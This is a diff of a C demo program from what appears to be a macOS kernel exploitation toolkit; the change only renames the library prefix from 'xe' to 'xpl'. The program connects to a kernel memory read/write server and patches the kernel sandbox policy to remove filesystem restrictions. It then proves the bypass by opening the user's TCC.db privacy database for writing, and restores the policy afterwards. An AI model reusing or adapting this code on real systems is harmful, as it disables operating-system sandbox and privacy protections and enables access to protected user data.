@@ -13,17 +13,17 @@
 #include <sys/fcntl.h>
 #include <sys/errno.h>
 
-#include <xe/xe.h>
-#include <xe/memory/kmem.h>
-#include <xe/memory/kmem_remote.h>
-#include <xe/slider/kernel.h>
-#include <xe/util/log.h>
-#include <xe/util/sandbox.h>
-#include <xe/util/assert.h>
+#include <xpl/xpl.h>
+#include <xpl/memory/kmem.h>
+#include <xpl/memory/kmem_remote.h>
+#include <xpl/slider/kernel.h>
+#include <xpl/util/log.h>
+#include <xpl/util/sandbox.h>
+#include <xpl/util/assert.h>
 
 
 int main(int argc, const char * argv[]) {
-    const char* kmem_socket = XE_DEFAULT_KMEM_SOCKET;
+    const char* kmem_socket = xpl_DEFAULT_KMEM_SOCKET;
     
     int ch;
     while ((ch = getopt(argc, (char**)argv, "k:")) != -1) {
@@ -34,43 +34,43 @@ int main(int argc, const char * argv[]) {
             }
             case '?':
             default: {
-                xe_log_info("usage: demo_sb [-k kmem_uds]");
+                xpl_log_info("usage: demo_sb [-k kmem_uds]");
                 exit(1);
             }
         }
     }
     
-    xe_init();
-    xe_kmem_backend_t backend;
-    int error = xe_kmem_remote_client_create(kmem_socket, &backend);
+    xpl_init();
+    xpl_kmem_backend_t backend;
+    int error = xpl_kmem_remote_client_create(kmem_socket, &backend);
     if (error) {
-        xe_log_error("failed to connect to kmem server unix domain socket %s, err: %s", kmem_socket, strerror(error));
+        xpl_log_error("failed to connect to kmem server unix domain socket %s, err: %s", kmem_socket, strerror(error));
         exit(1);
     }
     
-    xe_kmem_use_backend(backend);
-    xe_slider_kernel_init(xe_kmem_remote_client_get_mh_execute_header(backend));
+    xpl_kmem_use_backend(backend);
+    xpl_slider_kernel_init(xpl_kmem_remote_client_get_mh_execute_header(backend));
     
-    xe_util_sandbox_t sandbox = xe_util_sandbox_create();
-    xe_log_info("patching sandbox policy to get unrestricted filesystem access");
-    xe_util_sandbox_disable_fs_restrictions(sandbox);
+    xpl_util_sandbox_t sandbox = xpl_util_sandbox_create();
+    xpl_log_info("patching sandbox policy to get unrestricted filesystem access");
+    xpl_util_sandbox_disable_fs_restrictions(sandbox);
     
-    xe_log_info("verifying unrestricted filesystem access");
+    xpl_log_info("verifying unrestricted filesystem access");
     char* home = getenv("HOME");
     char tcc_db[PATH_MAX];
     snprintf(tcc_db, sizeof(tcc_db), "%s/Library/Application Support/com.apple.TCC/TCC.db", home);
     int fd = open(tcc_db, O_RDWR);
     if (fd < 0) {
-        xe_log_error("verfication failed, failed to open TCC.db at %s, err: %s", tcc_db, strerror(errno));
-        xe_util_sandbox_destroy(&sandbox);
+        xpl_log_error("verfication failed, failed to open TCC.db at %s, err: %s", tcc_db, strerror(errno));
+        xpl_util_sandbox_destroy(&sandbox);
         exit(1);
     } else {
-        xe_log_info("tcc.db open ok, verification success");
+        xpl_log_info("tcc.db open ok, verification success");
     }
     
     getpass("\n\npress enter to restore sandbox policy\n\n");
     
-    xe_log_info("restoring sandbox policy");
-    xe_util_sandbox_destroy(&sandbox);
+    xpl_log_info("restoring sandbox policy");
+    xpl_util_sandbox_destroy(&sandbox);
     return 0;
 }
